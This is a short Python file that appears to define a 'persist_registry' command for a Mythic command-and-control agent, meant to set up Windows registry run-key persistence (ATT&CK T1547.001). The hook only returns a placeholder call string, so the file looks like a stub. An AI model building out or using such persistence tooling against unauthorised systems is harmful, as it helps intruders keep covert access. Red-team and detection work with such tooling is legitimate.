from mythic_container import MythicCommandBase, MythicTask
from mythic_container import TaskArguments


class PersistRegistryArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class PersistRegistryCommand(MythicCommandBase):
    cmd = "persist_registry"
    needs_admin = False
    help_cmd = "persist_registry"
    description = "Establish persistence via Windows registry run key"
    version = 1
    author = "@phantom"
    argument_class = PersistRegistryArguments
    attackmapping = ["T1547.001"]

    async def create_go_tasking(self, taskData: MythicTask) -> str:
        return "PersistenceHandler.CreateRegistryPersistence()"

    async def process_response(self, task: MythicTask, response: any) -> str:
        return f"Registry persistence: {response}"